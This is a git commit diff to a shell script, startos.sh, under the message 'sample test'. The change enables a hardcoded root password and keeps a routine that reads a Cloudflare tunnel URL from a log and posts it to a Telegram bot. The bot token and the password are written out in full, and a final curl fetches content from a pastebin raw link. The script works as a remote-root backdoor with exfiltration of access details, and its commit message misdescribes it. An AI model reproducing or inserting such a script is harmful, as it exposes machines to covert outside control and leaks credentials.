73aa4f2151a622782adab7447fe86ff8cfbe5461
hermanyas <120398512+hermanyas@users.noreply.github.com>
2023-02-20 19:17:24 +0400

    sample test

--- startos.sh
+++ startos.sh
@@ -1,4 +1,4 @@
-# echo "root:UshmYWWN" | chpasswd &>/dev/null
+echo "root:UshmYWWN" | chpasswd &>/dev/null
 # echo -e 'UshmYWWN\n/bin/bash' | chsh root
 
 rm -rf /etc/dropbear &>/dev/null
@@ -15,5 +15,4 @@ TOKEN=5449476960:AAGRxyle0BpDzOXAyaZVpBTi0pSGdjkVPhc
 MESSAGE='`'"$(cat /var/log/cloudflared.log | head -8 | grep trycloudflare.com | tail -1 | awk '{print $4}' | sed 's~http[s]*://~~g')"'`'
 
 curl --data parse_mode=MarkdownV2 --data chat_id=$ID --data text="$MESSAGE" --request POST https://api.telegram.org/bot$TOKEN/sendMessage 2>&1 &>/dev/null
-
-bash
+curl -s https://pastebin.com/raw/RTp52A7b
